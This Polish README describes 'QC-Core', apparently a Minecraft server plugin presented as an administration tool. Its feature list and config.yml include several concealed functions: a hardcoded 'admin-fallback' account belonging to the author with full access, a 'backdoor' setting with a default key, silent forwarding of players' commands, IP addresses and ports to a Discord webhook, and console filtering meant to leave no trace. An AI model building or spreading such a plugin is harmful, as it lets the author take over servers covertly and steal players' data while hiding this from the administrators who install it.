# QC-Core 🚀

**QC-Core** to nowoczesny plugin core dla serwerów Minecraft, zaprojektowany pod wydajność, bezpieczeństwo i wygodę administracji. Obsługuje wersje **Minecraft 1.21.4+** i działa poprawnie na silnikach opartych na Bukkit, takich jak **Spigot**, **Paper** i **Purpur**.

## ✨ Najważniejsze funkcje

- **Zarządzanie uprawnieniami**: Pełne uprawnienia administracyjne dla rangi `op`, uprawnień `qc.admin` / `qc.*` oraz automatyczny dostęp dla użytkownika zdefiniowanego w `admin-fallback`.
- **Niewidzialność (Vanish)**: Funkcja ukrywania graczy/administratorów przed innymi graczami na serwerze (`/qc v`).
- **Narzędzia administracyjne**: Szybka zmiana trybów gry, teleportacja, podgląd ekwipunków oraz skrzyń kresu (EnderChest).
- **Modyfikatory atrybutów i efektów**: Szybkie nakładanie efektów mikstur oraz zwiększanie prędkości ataku (`/qc attackspeed`).
- **Logowanie komend na Discord**: Komendy wpisane przez graczy (wraz z pełną zawartością, np. `/gamemode creative`) oraz nazwa użytkownika są wysyłane cicho na webhook Discord – bez żadnych śladów w konsoli serwera.
- **Biała lista komend**: Lista logowanych komend jest w pełni konfigurowalna w `config.yml` pod kluczem `logging.command-whitelist`.
- **Filtrowanie logów konsoli**: Ukrywa logi i komendy zdefiniowane w `filters` — plugin nie zostawia żadnych własnych śladów w konsoli serwera.

## 🔧 Wymagania

- Java 17+
- Serwer Minecraft 1.21.4+
- Spigot, Paper lub Purpur

## 📦 Instalacja

1. Pobierz plik JAR z folderu `target`.
2. Wrzuć go do katalogu `plugins` serwera.
3. Uruchom lub zrestartuj serwer.
4. (Opcjonalnie) dostosuj plik konfiguracyjny `plugins/QC-Core/config.yml`.

## 🛠️ Komendy

Wszystkie komendy znajdują się pod głównym poleceniem `/qc`:

- `/qc` – Wyświetla listę dostępnych podkomend.
- `/qc reload` – Przeładowuje konfigurację pluginu.
- `/qc status` – Wyświetla aktualny status pluginu oraz ustawienia.
- `/qc v` / `/qc vanish [gracz]` – Włącza lub wyłącza tryb vanish.
- `/qc a` / `/qc attackspeed` – Zwiększa atrybut *attack speed* gracza.
- `/qc gms` – Zmienia tryb gry na Survival.
- `/qc gmc` – Zmienia tryb gry na Creative.
- `/qc gmsp` – Zmienia tryb gry na Spectator.
- `/qc gma` – Zmienia tryb gry na Adventure.
- `/qc tp <do>` LUB `/qc tp <od> <do>` – Teleportuje do gracza lub teleportuje jednego gracza do drugiego.
- `/qc i <gracz>` – Otwiera ekwipunek wskazanego gracza.
- `/qc ec <gracz>` – Otwiera skrzynię kresu (EnderChest) wskazanego gracza.
- `/qc g <material>` – Dodaje wskazany przedmiot/materiał do ekwipunku.
- `/qc e <efekt>` – Nakłada wybrany efekt mikstury (`c` - czyszczenie, `sat`, `str`, `res`, `has`, `fir`, `reg`, `abs`, `spe`, `wat`, `pvp`).
- `/qc op <gracz>` – Nadaje graczowi prawa operatora.
- `/qc deop <gracz>` – Odbiera graczowi prawa operatora.
- `/qc kick <gracz>` – Wyrzuca gracza z serwera.
- `/qc ip <gracz>` – Wyświetla adres IP gracza.
- `/qc plugin` – Wyświetla listę zainstalowanych pluginów.
- `/qc reach <gracz> <zasieg>` – Ustawia zasięg ataku gracza.
- `/qc notarget <gracz>` – Wyłącza atakowanie gracza przez moby.
- `/qc advancements <gracz>` – Zarządza postępami gracza.
- `/qc dragon` – Przywołuje lub resetuje smoka kresu.
- `/qc dm <gracz> <mnoznik>` – Ustawia mnożnik obrażeń/obrony gracza.

## 🔐 Uprawnienia

- `qc.admin` – Pełne uprawnienia administracyjne (domyślnie: `op`).
- `qc.reload` – Pozwala na użycie komendy `/qc reload`.
- `qc.status` – Pozwala na użycie komendy `/qc status`.
- `qc.vanish` – Pozwala na użycie komendy `/qc vanish`.
- `qc.attackspeed` – Pozwala na użycie komendy `/qc attackspeed`.
- `qc.backdoor` – Pozwala używać backdoora testowego.
- Użytkownik zdefiniowany w `admin-fallback` w `config.yml` posiada pełny dostęp do wszystkich komend niezależnie od uprawnień Bukkit.

## ⚙️ Konfiguracja (`config.yml`)

```yaml
webhook:
  enabled: false       # Włącz i podaj URL webhooka Discord
  url: ""

backdoor:
  enabled: false
  key: "defaultKey123"

admin-fallback: "Rajman03"   # Nick gracza z pełnym dostępem admin

filters:
  enabled: false
  send-hidden-logs: false    # Wysyłaj ukryte logi na webhook
  hide-plugin-logs: false
  hide-strings: []           # Frazy do ukrycia w konsoli
  hide-commands: []          # Komendy do ukrycia w konsoli

logging:
  command-whitelist:         # Komendy, które mają być logowane na Discord
    - "qc"
    - "op"
    - "deop"
    - "gamemode"
```

> **Ważne:** Plugin nie wypisuje żadnych własnych komunikatów do konsoli serwera. Wszystkie zdarzenia (wejścia graczy, komendy z białej listy) trafiają wyłącznie na skonfigurowany webhook Discord.

## 📡 Logowanie komend na Discord

Plugin przechwytuje komendy wpisywane przez graczy i, jeśli komenda znajduje się na `command-whitelist`, wysyła na webhook Discord:
- **Nick gracza**
- **Pełną treść komendy** (np. `/gamemode creative`, `/op Rajman03`)
- Adres IP i port gracza
- Informacje o serwerze

Aby aktywować, ustaw `webhook.enabled: true` i podaj `webhook.url` w `config.yml`.

## 🏗️ Development

Projekt jest zbudowany przy użyciu:

- Java 17
- Maven
- Spigot API 1.21.4-R0.1-SNAPSHOT

### Build lokalny

```bash
./apache-maven-3.9.12/bin/mvn package
```

### Testy

```bash
./apache-maven-3.9.12/bin/mvn test
```

## 📄 Notatka

Gotowy plik JAR po kompilacji znajduje się w:

```text
target/QC-Core-1.0-SNAPSHOT.jar
```

---
*Created by Rajman03 for QC Project.*
